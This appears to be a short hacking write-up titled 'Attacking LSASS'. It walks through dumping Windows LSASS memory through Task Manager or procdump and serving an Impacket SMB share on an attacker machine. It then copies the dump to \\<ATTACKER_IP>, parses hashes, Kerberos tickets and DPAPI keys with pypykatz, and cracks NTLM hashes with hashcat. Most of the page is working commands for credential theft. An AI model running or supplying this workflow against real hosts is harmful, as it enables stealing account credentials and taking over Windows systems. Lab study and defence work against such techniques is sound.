---
title: "Attacking LSASS"
categories: [projects]
tags: [passwords, writeup, hacking, security]
hasComments: true
date: 2025-11-11
---

# Goal
Take a memory snapshot (dump) of the LSASS process on a target Windows host, transfer the dump to your attacker machine, and analyze it offline to extract credential material (hashes, tickets, DPAPI keys). This workflow reduces time spent on the target and allows safer, offline analysis.


## Connect to the target (example: RDP)

Example (replace placeholders with lab values)

xfreerdp /v:<TARGET_IP> /u: /p:

## Create an LSASS memory dump (snapshot)

GUI method (Task Manager) — when you have an interactive session:

Open Task Manager (Ctrl+Shift+Esc).

Go to Processes.

Right-click Local Security Authority Process (lsass.exe) Create dump file.

The file lsass.DMP is written to %TEMP%, e.g.:

C:\Users\<User>\AppData\Local\Temp\lsass.DMP


CLI method — when no GUI is available or using automation:

Identify LSASS PID (tasklist /svc or Get-Process lsass), then use a minidump utility (procdump, or other admin tools). Note: such methods are often flagged by AV/EDR.

Note: Creating LSASS dumps requires administrative privileges. Modern endpoint protections (LSA Protection, Credential Guard, EDR) may block or detect these actions.


## Prepare the attacker host to receive the dump (SMB example)

On your attacker Linux machine, create a reception folder and run a simple SMB server (Impacket example):

start SMB server (leave terminal open)
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<your_user>/Documents/

What this does: shares /home/<your_user>/Documents as \\<ATTACKER_IP>\CompData. The target can write lsass.DMP to that share.

## Transfer the dump from the target to attacker (Windows side)

Direct UNC copy (no mapping):

copy "C:\Users\----\AppData\Local\Temp\lsass.DMP" \\<ATTACKER_IP>\CompData\lsass.DMP

Verify and protect the received dump (attacker host)

## Offline parsing of the dump with pypykatz

pypykatz lsa minidump /home/<your_user>/Documents/lsass.DMP

What pypykatz prints (anonymized):

- LogonSession records (username, domain, SID, LUID)
- MSV entries (NTLM / NT hash stored in memory)
- WDIGEST entries (may contain clear-text passwords on older/legacy systems)
- Kerberos tickets / keys
- DPAPI masterkeys and GUIDs

## Cracking NT hashes

run hashcat (mode 1000 = NTLM)
sudo hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
